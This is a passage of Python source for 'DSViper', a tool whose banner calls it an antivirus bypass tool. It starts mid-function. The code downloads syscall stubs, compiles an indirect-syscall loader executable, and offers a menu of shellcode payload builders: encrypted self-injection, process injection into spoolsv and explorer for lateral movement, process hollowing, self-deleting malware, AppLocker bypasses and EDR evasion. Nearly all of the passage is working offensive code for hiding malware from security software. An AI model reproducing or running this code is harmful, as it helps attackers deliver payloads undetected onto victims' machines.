    except requests.RequestException as e:
        print(f"Error: {e}")
        exit(1)
    print

    try:
        res = requests.get(url3)
        with open("syscalls.h", "wb") as f:
            f.write(res.content)
    except requests.RequestException as e:
        print(f"Error: {e}")
        exit(1)

    try:
        subprocess.run(["uasm", "-win64", "syscalls.asm", "-Fo=syscalls.obj"], check=True, stdout=subprocess.PIPE,
                       stderr=subprocess.PIPE)
        subprocess.run(["x86_64-w64-mingw32-gcc", "-c", "indirect.c", "-o", "dhanush.obj"], check=True,
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        subprocess.run(["x86_64-w64-mingw32-gcc", "dhanush.obj", "syscalls.o", "-o", "DSViper_indirect_2.exe"],
                       check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        print(f"[green bold][*]Payload successfully created as DSViper_indirect_2.exe[/green bold]")
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")

    files = ["syscalls.asm", "indirect.c", "syscalls.h", "syscalls.o", "dhanush.obj"]
    for file in files:
        os.remove(file)

def payload_menu():
    menu = (
        "Enter your payload choice:\n"
        "1.) self-injection(XOR)\n"
        "2.) self-injection(AES)\n"
        "3.) Process Injection(spoolsv) (Can be used for lateral movement)\n"
        "4.) Process Hollow\n"
        "[bold red]5.) Self Deleting Malware "
        "(HAVE TO WAIT, CLOSE TO A MINUTE FOR THE PAYLOAD TO EXECUTE)[/bold red]\n"
        "6.) DLL side-load/rundll32 applocker bypass\n"
        "7.) Process Injection(explorer.exe)\n"
        "[bold red]8.) Powershell "
        "(Will bypass with cloud detections enabled as well)"
        "(Make sure to run this payload twice)(use x64 payload only)[/bold red]\n"
        "[bold green]9.) Applocker bypass small shellcodes "
        "(Make sure to use x86 payloads)(Change .exe name after every run)"
        "(Run this payload twice)[/bold green]\n"
        "[bold magenta]10.) Applocker bypass Havoc/large shellcodes "
        "(use x86 payloads only)[/bold magenta]\n"
        "[bold red]11.) Indirect Syscall (Windows 10)(Possible EDR bypass loader)[/bold red]\n"
        "12.) EnumPageFiles exec\n"
        "[bold red]13.) EDR bypass[/bold red]\n"
    )
    payloads = {
        1: "xor",
        2: "aes",
        3: "spoolsv",
        4: "prochollow",
        5: "selfdel",
        6: "sideload",
        7: "procinject",
        8: "pwsh",
        9: "applocker1",
        10: "applocker2",
        11: "indirect",
        12: "enumpagefile",
        13: "indirect2"
    }
    while True:
        choice = console.input(f"{menu}\n> ")
        if choice.isdigit():
            payload = int(choice)
            if payload not in payloads.keys():
                continue
            else:
                break
        console.print("Invalid choice.")
    return payloads[payload]
def filepath_menu():
    while True:
        filepath = console.input("Enter shellcode path: ")
        if os.path.exists(filepath) and os.path.isfile(filepath):
            return filepath
        console.print("[red]File does not exist[/red]")

def main():
    parser = argparse.ArgumentParser(description="DSViper")
    parser.add_argument("filepath",
                        nargs="?",
                        help="path to shellcode")
    parser.add_argument(
        "payload",
        nargs="?",
        help="Payload type: xor, aes, spoolsv, prochollow, selfdel, "
             "sideload, procinject, pwsh, applocker1, applocker2, indirect, "
             "enumpagefile, indirect2"
    )
    parser.add_argument("-v", "--verbose", action="store_true", help="Print banner")
    args = parser.parse_args()

    if args.verbose:
        banner = f"""
    
    ░▒▓███████▓▒░ ░▒▓███████▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓███████▓▒░░▒▓████████▓▒░▒▓███████▓▒░  
    ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░             ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
    ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░              ░▒▓█▓▒▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
    ░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░        ░▒▓█▓▒▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓██████▓▒░ ░▒▓███████▓▒░  
    ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░        ░▒▓█▓▓█▓▒░ ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
    ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░        ░▒▓█▓▓█▓▒░ ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
    ░▒▓███████▓▒░░▒▓███████▓▒░          ░▒▓██▓▒░  ░▒▓█▓▒░▒▓█▓▒░      ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░ 
    ................................................
                          AntiVirus Bypass Tool (v.0.2.1)   
    ---------------------------------------------------------
    Created by Dhanush Gowda(dagowda) and Sumanth Vankineni
    ---------------------------------------------------------
    ................................................
    
    """
        print(banner)
    filepath = filepath_menu() if args.filepath is None else args.filepath
    payload = payload_menu() if not args.payload else args.payload

    payloads = {
        "xor": HAVOCone,
        "aes": HAVOCtwo,
        "spoolsv": HAVOCfour,
        "prochollow": HAVOCsixAES_withhollow,
        "selfdel": HAVOCseven_dynamic_dhanush,
        "sideload": HAVOCeightAES_hollow_dll,
        "procinject": HAVOCnine_enc,
        "pwsh": powershell_havocevery,
        "applocker1": applocker_installutil,
        "applocker2": applocker_installutil2,
        "indirect": indirect,
        "enumpagefile": enumpagew,
        "indirect2": indirect2,

    }
    payloads[payload](filepath)
if __name__ == "__main__":
    main()
